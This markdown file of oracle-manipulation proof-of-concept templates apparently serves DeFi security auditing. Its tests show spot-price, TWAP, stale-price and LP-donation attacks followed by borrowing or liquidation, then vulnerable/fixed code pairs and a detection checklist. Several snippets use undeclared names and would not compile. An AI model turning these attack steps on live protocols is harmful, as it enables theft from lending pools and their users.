# Oracle Manipulation PoC Templates

## EVM - Spot Price Manipulation
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IVulnerableOracle {
    function getPrice() external view returns (uint256);
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112, uint112, uint32);
}

contract OracleManipulationTest is Test {
    IVulnerableOracle oracle;
    IUniswapV2Pair pair;
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"));
    }

    function testSpotPriceManipulation() public {
        uint256 priceBefore = oracle.getPrice();
        
        // Get pair reserves
        (uint112 reserve0, uint112 reserve1,) = pair.getReserves();
        
        // Calculate swap amount to manipulate price by 50%
        uint256 swapAmount = reserve0 / 2;
        
        vm.startPrank(attacker);
        
        // Borrow tokens (flash loan)
        deal(address(token0), attacker, swapAmount);
        
        // Swap to manipulate spot price
        token0.transfer(address(pair), swapAmount);
        uint256 amountOut = getAmountOut(swapAmount, reserve0, reserve1);
        pair.swap(0, amountOut, attacker, "");
        
        // Price is now manipulated
        uint256 priceAfter = oracle.getPrice();
        assertGt(priceAfter, priceBefore * 140 / 100, "Price should increase >40%");
        
        // Exploit vulnerable protocol at manipulated price
        vulnerableProtocol.borrow(collateral);
        
        vm.stopPrank();
    }
}
```

## EVM - TWAP Manipulation (Multi-Block)
```solidity
contract TWAPManipulationTest is Test {
    function testTWAPManipulation() public {
        // TWAP requires multiple blocks
        for (uint256 i = 0; i < 10; i++) {
            // Manipulate price each block
            pair.swap(manipulationAmount, 0, attacker, "");
            
            // Mine next block
            vm.roll(block.number + 1);
            vm.warp(block.timestamp + 12);
        }
        
        // TWAP now reflects manipulated price
        uint256 twapPrice = oracle.consult(token, 600); // 10 min TWAP
    }
}
```

## EVM - Chainlink Stale Price
```solidity
interface AggregatorV3Interface {
    function latestRoundData() external view returns (
        uint80 roundId,
        int256 answer,
        uint256 startedAt,
        uint256 updatedAt,
        uint80 answeredInRound
    );
}

contract StaleOracleTest is Test {
    AggregatorV3Interface priceFeed;

    function testStalePrice() public {
        // Get price data
        (
            uint80 roundId,
            int256 price,
            uint256 startedAt,
            uint256 updatedAt,
            uint80 answeredInRound
        ) = priceFeed.latestRoundData();
        
        // Check for stale data
        bool isStale = (block.timestamp - updatedAt) > 3600; // 1 hour
        bool isIncomplete = answeredInRound < roundId;
        
        if (isStale || isIncomplete) {
            // Vulnerable: protocol uses stale price
            // Attack: wait for price deviation, exploit before update
        }
    }

    function testExploitStalePrice() public {
        // Warp time to make oracle stale
        vm.warp(block.timestamp + 7200); // 2 hours
        
        // Real market price has changed, oracle hasn't updated
        // Exploit the difference
        vulnerableProtocol.liquidate(position); // Uses stale oracle
    }
}
```

## EVM - LP Token Price Manipulation
```solidity
contract LPOracleManipulationTest is Test {
    function testLPTokenPriceManipulation() public {
        // Many protocols value LP tokens using: 
        // price = 2 * sqrt(reserve0 * reserve1) / totalSupply
        
        // This is vulnerable to manipulation via:
        // 1. Donate tokens directly to pair (inflate reserves)
        // 2. Flash loan + large swap
        
        uint256 lpPriceBefore = vulnerableOracle.getLPTokenPrice(pair);
        
        // Donate tokens to inflate reserves
        token0.transfer(address(pair), 1000 ether);
        pair.sync(); // Update reserves
        
        uint256 lpPriceAfter = vulnerableOracle.getLPTokenPrice(pair);
        assertGt(lpPriceAfter, lpPriceBefore);
        
        // Use inflated LP tokens as collateral
        vulnerableProtocol.depositCollateral(lpTokens);
        vulnerableProtocol.borrow(maxBorrowAmount);
    }
}
```

## Solana - Pyth Oracle Issues
```typescript
describe("Pyth Oracle Manipulation", () => {
    it("exploits stale pyth price", async () => {
        // Pyth prices have confidence intervals and staleness
        const priceData = await pythClient.getPriceNoOlderThan(
            priceFeedId,
            60 // max age in seconds
        );
        
        // Vulnerable if protocol doesn't check:
        // 1. Price confidence interval
        // 2. Price staleness
        // 3. Price status (trading vs halted)
        
        if (priceData.confidence > priceData.price * 0.05) {
            // High uncertainty - potential for exploitation
        }
    });
});
```

## Common Vulnerable Patterns

### No Staleness Check
```solidity
// Vulnerable
function getPrice() external view returns (uint256) {
    (, int256 price,,,) = priceFeed.latestRoundData();
    return uint256(price);
}

// Fixed
function getPrice() external view returns (uint256) {
    (
        uint80 roundId,
        int256 price,
        ,
        uint256 updatedAt,
        uint80 answeredInRound
    ) = priceFeed.latestRoundData();
    
    require(price > 0, "Invalid price");
    require(updatedAt > block.timestamp - MAX_DELAY, "Stale price");
    require(answeredInRound >= roundId, "Stale round");
    
    return uint256(price);
}
```

### Spot Price as Oracle
```solidity
// Vulnerable - uses spot price
function getPrice() external view returns (uint256) {
    (uint112 reserve0, uint112 reserve1,) = pair.getReserves();
    return reserve1 * 1e18 / reserve0;
}

// Fixed - use TWAP
function getPrice() external view returns (uint256) {
    return oracle.consult(token, TWAP_PERIOD);
}
```

## Detection Checklist
- [ ] Uses spot price instead of TWAP
- [ ] No staleness checks on Chainlink
- [ ] No confidence interval checks on Pyth
- [ ] LP token pricing using sqrt formula
- [ ] Single source oracle (no aggregation)
- [ ] No circuit breakers for large price moves
